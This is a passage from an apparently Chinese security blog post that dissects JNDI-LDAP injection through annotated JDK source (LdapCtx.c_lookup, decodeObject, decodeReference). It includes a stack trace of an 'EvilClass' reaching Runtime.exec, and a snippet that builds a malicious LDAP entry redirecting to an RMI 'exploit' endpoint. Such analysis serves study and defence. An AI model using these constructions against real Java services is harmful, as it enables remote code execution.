<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.Runtime.exec(Runtime.java:347)</span><br><span class="line">at EvilClass.&lt;clinit&gt;(EvilClass.java:4)</span><br><span class="line">at java.lang.Class.forName0(Class.java:-1)</span><br><span class="line">at java.lang.Class.forName(Class.java:348)</span><br><span class="line">at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:72)</span><br><span class="line">at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:87)</span><br><span class="line">at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:158)</span><br><span class="line">at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)</span><br><span class="line">at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)</span><br><span class="line">at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)</span><br><span class="line">at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at org.example.Client.main(Client.java:9)</span><br></pre></td></tr></table></figure></div>

<p><code>new InitialContext().lookup(&quot;ldap://localhost:1389/exploit&quot;)</code> 表示的是 <strong>JNDI 按 URL 前缀选择 LDAP 提供者</strong> → <strong>对 LDAP 服务器发起一次“BASE&#x2F;OBJECT”搜索</strong>（只查这个 DN，对应 URL 末尾的那段）</p>
<p>之后服务器把<strong>一个条目（Entry）</strong>回给 JNDI，JNDI 再尝试把这个条目<strong>还原成 Java 对象</strong>。</p>
<p>整个过程的核心逻辑位于 <code>LdapCtx#c_lookup</code> 函数：</p>
<ol>
<li>首先 <code>doSearchOnce(name, &quot;(objectClass=*)&quot;, cons, true)</code> 向 LDAP 服务器发起一次搜索，这里我们的恶意服务器会返回一个包含恶意类的 <code>References</code> 的 <code>entry</code>。</li>
<li>如果条目中 <code>javaClassName</code> 属性不为空，则会调用 <code>Obj.decodeObject</code> 解析得到 <code>Reference</code> 对象。</li>
<li><code>DirectoryManager.getObjectInstance</code> 会根据我们的解析得到 <code>Reference</code> 对象加载 <code>javaCodeBase</code> 对应的 URL 下的 <code>javaFactory</code> 属性指定的工厂类。</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在当前 LdapCtx 上执行一次“查找”。</span></span><br><span class="line"><span class="comment">// name：待查的相对/绝对名（DN）</span></span><br><span class="line"><span class="comment">// cont：Continuation，用于当发生 referral / partial result 时把上下文填入异常</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">c_lookup</span><span class="params">(Name name, Continuation cont)</span></span><br><span class="line">        <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="comment">// 先把错误上下文绑定到 cont（若后续抛异常，能带上定位信息）</span></span><br><span class="line">    cont.setError(<span class="built_in">this</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;      <span class="comment">// 最终要返回的对象（可能是已解码的 Java 对象，也可能是一个新的 LdapCtx）</span></span><br><span class="line">    Attributes attrs;       <span class="comment">// 从 LDAP 返回的属性集合（如果找到条目）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 构造一次仅查“该对象本身”的搜索请求（OBJECT_SCOPE）</span></span><br><span class="line">        <span class="type">SearchControls</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchControls</span>();</span><br><span class="line">        cons.setSearchScope(SearchControls.OBJECT_SCOPE);   <span class="comment">// 只查当前 DN，不下潜</span></span><br><span class="line">        cons.setReturningAttributes(<span class="literal">null</span>);                  <span class="comment">// null=请求所有属性（由服务器裁剪）</span></span><br><span class="line">        cons.setReturningObjFlag(<span class="literal">true</span>);                     <span class="comment">// 需要属性值（用于后面解码 Java 对象）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 📌 发起一次搜索：过滤器为 (objectClass=*)，等价“只要存在就取回来”</span></span><br><span class="line">        <span class="comment">//    第 4 个参数 true 通常表示遵循/处理某些控件或标志（取决于底层实现）</span></span><br><span class="line">        <span class="type">LdapResult</span> <span class="variable">answer</span> <span class="operator">=</span> doSearchOnce(name, <span class="string">&quot;(objectClass=*)&quot;</span>, cons, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存服务器返回的 response controls（条目外层的响应控件）</span></span><br><span class="line">        respCtls = answer.resControls;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 错误码处理：非 LDAP_SUCCESS 则按返回码抛出相应异常（含 referral 等）</span></span><br><span class="line">        <span class="keyword">if</span> (answer.status != LdapClient.LDAP_SUCCESS) &#123;</span><br><span class="line">            processReturnCode(answer, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 取回条目与属性：</span></span><br><span class="line">        <span class="comment">//    - 按语义期望 1 个 SearchResult；没有或数量不为 1，则给空属性集占位</span></span><br><span class="line">        <span class="keyword">if</span> (answer.entries == <span class="literal">null</span> || answer.entries.size() != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 找到了“名”，但没拿到属性 —— 构造一个大小写不敏感的空属性集</span></span><br><span class="line">            attrs = <span class="keyword">new</span> <span class="title class_">BasicAttributes</span>(LdapClient.caseIgnore);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 正常：拿到第一个也是唯一的条目</span></span><br><span class="line">            <span class="type">LdapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> answer.entries.elementAt(<span class="number">0</span>);</span><br><span class="line">            attrs = entry.attributes;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 合并条目级别的 response controls（与外层 response controls 合并）</span></span><br><span class="line">            Vector&lt;Control&gt; entryCtls = entry.respCtls;</span><br><span class="line">            <span class="keyword">if</span> (entryCtls != <span class="literal">null</span>) &#123;</span><br><span class="line">                appendVector(respCtls, entryCtls);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 📌 如果条目包含“Java 对象扩展属性”，尝试解码为 Java 对象</span></span><br><span class="line">        <span class="comment">//    Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME] 通常对应 &quot;javaClassName&quot;</span></span><br><span class="line">        <span class="comment">//    decodeObject 会处理两种分支：</span></span><br><span class="line">        <span class="comment">//    - javaSerializedData：反序列化对象（受 JEP 290 过滤影响）</span></span><br><span class="line">        <span class="comment">//    - javaNamingReference / javaFactory / javaCodeBase：Reference → 调用工厂</span></span><br><span class="line">        <span class="keyword">if</span> (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != <span class="literal">null</span>) &#123;</span><br><span class="line">            obj = Obj.decodeObject(attrs);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6) 如果没有可解码的 Java 对象（或解码失败/未命中），则按 JNDI 语义：</span></span><br><span class="line">        <span class="comment">//    返回一个指向该 DN 的新 LdapCtx（即目录上下文对象，而非实体对象）</span></span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            obj = <span class="keyword">new</span> <span class="title class_">LdapCtx</span>(<span class="built_in">this</span>, fullyQualifiedName(name));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (LdapReferralException e) &#123;</span><br><span class="line">        <span class="comment">// 7) Referral 处理：</span></span><br><span class="line">        <span class="comment">//    如果策略是“抛出”，则把当前上下文信息塞进异常后直接抛</span></span><br><span class="line">        <span class="keyword">if</span> (handleReferrals == LdapClient.LDAP_REF_THROW)</span><br><span class="line">            <span class="keyword">throw</span> cont.fillInException(e);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 否则按“顺序处理转介”的策略，一个个跟随 referral 去重试</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 基于 referral 信息获取一个“转介上下文”，带上当前环境与绑定控件</span></span><br><span class="line">            <span class="type">LdapReferralContext</span> <span class="variable">refCtx</span> <span class="operator">=</span></span><br><span class="line">                (LdapReferralContext) e.getReferralContext(envprops, bindCtls);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 在 referral 指向的新上下文上，重复原始的 lookup 操作</span></span><br><span class="line">                <span class="keyword">return</span> refCtx.lookup(name);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (LdapReferralException re) &#123;</span><br><span class="line">                <span class="comment">// 如果追随转介过程中又遇到新的 referral，则继续循环处理</span></span><br><span class="line">                e = re;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 无论成功失败，都要关闭 referral 上下文，避免泄露</span></span><br><span class="line">                refCtx.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="comment">// 其他 JNDI 命名异常：补全上下文信息后抛出</span></span><br><span class="line">        <span class="keyword">throw</span> cont.fillInException(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 8) 📌 交给 DirectoryManager 最终“对象工厂”阶段处理：</span></span><br><span class="line">        <span class="comment">//    - 如果 obj 是 Reference/Referenceable 或者存在已注册的 ObjectFactory</span></span><br><span class="line">        <span class="comment">//      则可能在这里被转换成“更高层的业务对象”</span></span><br><span class="line">        <span class="comment">//    - 否则通常直接原样返回 obj</span></span><br><span class="line">        <span class="keyword">return</span> DirectoryManager.getObjectInstance(obj, name,</span><br><span class="line">            <span class="built_in">this</span>, envprops, attrs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="comment">// 工厂阶段抛 NamingException：同样补上下文后抛</span></span><br><span class="line">        <span class="keyword">throw</span> cont.fillInException(e);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 其他任意异常：包装成 NamingException 再抛</span></span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">e2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(</span><br><span class="line">                <span class="string">&quot;problem generating object using object factory&quot;</span>);</span><br><span class="line">        e2.setRootCause(e);</span><br><span class="line">        <span class="keyword">throw</span> cont.fillInException(e2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>decodeObject</code> 是 <code>com.sun.jndi.ldap.Obj</code> 类中的一个静态方法，用于从 LDAP 的属性集合中“解码”出一个 Java 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 从 LDAP 的属性集合中“解码”出一个 Java 对象。</span></span><br><span class="line"><span class="comment"> * 可能返回：</span></span><br><span class="line"><span class="comment"> *   1) 反序列化得到的对象（javaSerializedData 分支）</span></span><br><span class="line"><span class="comment"> *   2) 远程 RMI 对象（兼容旧实现）</span></span><br><span class="line"><span class="comment"> *   3) Reference 对象经 ObjectFactory 还原的实例（javaNamingReference 分支）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 具体属性格式见 encodeObject() / encodeReference() 的约定。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> Object <span class="title function_">decodeObject</span><span class="params">(Attributes attrs)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    Attribute attr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 codebase（可能是多个 URL），三种分支都会用到。</span></span><br><span class="line">    <span class="comment">// 一般来自 LDAP 属性 &quot;javaCodeBase&quot;；getCodebases 会把它拆成 String[]。</span></span><br><span class="line">    String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// —— 📌 分支 1：javaSerializedData —— //</span></span><br><span class="line">        <span class="comment">// 若条目包含序列化字节（&quot;javaSerializedData&quot;），则按该 codebase 构造类加载器，</span></span><br><span class="line">        <span class="comment">// 用它来反序列化成对象（需要能解析到类定义）。</span></span><br><span class="line">        <span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> helper.getURLClassLoader(codebases); <span class="comment">// 可能返回 URLClassLoader 或 null</span></span><br><span class="line">            <span class="keyword">return</span> deserializeObject((<span class="type">byte</span>[]) attr.get(), cl);</span><br><span class="line">        <span class="comment">// —— 📌 分支 2：javaRemoteLocation（历史兼容） —— //</span></span><br><span class="line">        <span class="comment">// 如果条目包含“远程位置”（&quot;javaRemoteLocation&quot;），走旧的 RMI 对象解码逻辑。</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[REMOTE_LOC])) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 仅为向后兼容：通过类名 + 远程位置 + codebase 组装出一个 RMI 对象引用</span></span><br><span class="line">            <span class="keyword">return</span> decodeRmiObject(</span><br><span class="line">                (String) attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(), <span class="comment">// &quot;javaClassName&quot;</span></span><br><span class="line">                (String) attr.get(),                                   <span class="comment">// 远程位置字符串</span></span><br><span class="line">                codebases);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// —— 📌 分支 3：Reference（javaNamingReference） —— //</span></span><br><span class="line">        <span class="comment">// 检查 objectClass 是否声明了“这是一个 Java 引用对象”（支持大小写两套常量）</span></span><br><span class="line">        attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);</span><br><span class="line">        <span class="keyword">if</span> (attr != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">            (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) ||</span><br><span class="line">             attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123;</span><br><span class="line">            <span class="comment">// 把 LDAP 属性解码成 javax.naming.Reference，</span></span><br><span class="line">            <span class="comment">// 再结合 codebase 通过 ObjectFactory 生成真正的对象实例。</span></span><br><span class="line">            <span class="keyword">return</span> decodeReference(attrs, codebases);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若三种分支都不匹配，则说明这条目不是“可解码成 Java 对象”的条目，返回 null。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// 统一把 I/O 异常包装成 NamingException 往上抛（JNDI 的异常语义）</span></span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        ne.setRootCause(e);</span><br><span class="line">        <span class="keyword">throw</span> ne;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>decodeObject</code> 主要有三个分支：</p>
<ul>
<li><p><strong><code>javaSerializedData</code> 分支</strong> ：若条目包含序列化字节属性 <code>javaSerializedData</code> 则将其反序列化，这也是后面要介绍的 JNDI-LDAP 的反序列化做法。</p>
</li>
<li><p><strong><code>javaRemoteLocation</code> 分支</strong> ：如果条目包含远程位置属性 <code>javaRemoteLocation</code>，走旧的 RMI 对象解码逻辑。例如我们的 LDAP 的 <code>entry</code> 构造成下面这种形式：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.entry = <span class="keyword">new</span> <span class="title class_">Entry</span>(BASE);</span><br><span class="line">entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaObject&quot;</span>);</span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">entry.addAttribute(<span class="string">&quot;javaRemoteLocation&quot;</span>, <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>则会构造并返回一个 <code>Reference</code> 对象，其中的 <code>rmiName</code> 被设置为 <code>rmi://127.0.0.1:1099/exploit</code>，也就是 <code>entry</code> 的 <code>javaRemoteLocation</code> 属性。之后会根据 <code>rmiName</code> 执行 JNDI-RMI 的远程加载类的操作：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:132)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">at com.sun.jndi.url.rmi.rmiURLContextFactory.getUsingURL(rmiURLContextFactory.java:71)</span><br><span class="line">at com.sun.jndi.url.rmi.rmiURLContextFactory.getObjectInstance(rmiURLContextFactory.java:56)</span><br><span class="line">at javax.naming.spi.NamingManager.getURLObject(NamingManager.java:601)</span><br><span class="line">at javax.naming.spi.NamingManager.processURL(NamingManager.java:381)</span><br><span class="line">at javax.naming.spi.NamingManager.processURLAddrs(NamingManager.java:361)</span><br><span class="line">at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:207)</span><br><span class="line">at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)</span><br><span class="line">at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)</span><br><span class="line">at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at org.example.Client.main(Client.java:9)</span><br></pre></td></tr></table></figure></div>

<p>逻辑跟前面的 JNDI-RMI 的一致（等价于 <code>(new InitialContext()).lookup(&quot;rmi://localhost:1099/exploit&quot;);</code>），既可以用远程类加载也可以用反序列化，因此比较鸡肋。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 目录中以 RMI 对象的方式存放时，常见属性为：</span></span><br><span class="line"><span class="comment"> *  javaClassName        → 期望的对象类型（通常写远程接口类名）</span></span><br><span class="line"><span class="comment"> *  javaRemoteLocation   → RMI 对象的位置 URL（通过 RMI Registry 访问）</span></span><br><span class="line"><span class="comment"> *  javaCodebase         → 可选，类的 codebase（此分支里被忽略）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 函数返回“RMI 位置 URL”封装成的 Reference。</span></span><br><span class="line"><span class="comment"> * 之后由 getObjectInstance() 再把它解析成真正的 RMI 对象（stub）。</span></span><br><span class="line"><span class="comment"> * 注意：此方式已废弃，仅作向后兼容。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">decodeRmiObject</span><span class="params">(String className,</span></span><br><span class="line"><span class="params">    String rmiName, String[] codebases)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="comment">// 构造一个 javax.naming.Reference：</span></span><br><span class="line">    <span class="comment">//  - 目标类型：className（JNDI 语义上的目标类）</span></span><br><span class="line">    <span class="comment">//  - 地址项：StringRefAddr，类型键为 &quot;URL&quot;，值为 rmiName（形如 rmi://host:port/name）</span></span><br><span class="line">    <span class="comment">// 没有提供工厂类名/位置；交由通用 URL 上下文工厂去处理这个 &quot;URL&quot; 地址。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(className, <span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;URL&quot;</span>, rmiName));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 上层调用处（来自 decodeObject(...) 的分支 2）：</span></span><br><span class="line"><span class="comment">// 当检测到 LDAP 条目里有 javaRemoteLocation 时，取出：</span></span><br><span class="line"><span class="comment">//   - javaClassName → 作为 className</span></span><br><span class="line"><span class="comment">//   - javaRemoteLocation → 作为 rmiName</span></span><br><span class="line"><span class="comment">// 并调用 decodeRmiObject(...) 生成 Reference 返回。</span></span><br><span class="line"><span class="keyword">return</span> decodeRmiObject(</span><br><span class="line">    (String) attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(),</span><br><span class="line">    (String) attr.get(),                     <span class="comment">// 这里的 attr 即 javaRemoteLocation</span></span><br><span class="line">    codebases);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>javaNamingReference</code> 分支</strong> ：如果 <code>objectClass</code> 属性的值设置为 <code>javaNamingReference</code> 则调用 <code>decodeReference</code> 构造 <code>Reference</code> 对象。</p>
<p>  <code>decodeReference</code> 会根据 <code>javaClassName</code>、<code>javaFactory</code> 和 <code>javaCodeBase</code> 构造一个 <code>Reference</code> 对象，因此我们在 LDAP 的 <code>entry</code> 中要设置这三个属性。</p>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 从若干 LDAP 属性还原出一个 Reference 对象</span></span><br><span class="line"><span class="comment">* （对应 JNDI-LDAP 的 javaNamingReference 分支）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Reference <span class="title function_">decodeReference</span><span class="params">(Attributes attrs,</span></span><br><span class="line"><span class="params">  String[] codebases)</span> <span class="keyword">throws</span> NamingException, IOException &#123;</span><br><span class="line"></span><br><span class="line">  Attribute attr;</span><br><span class="line">  String className;</span><br><span class="line">  <span class="type">String</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 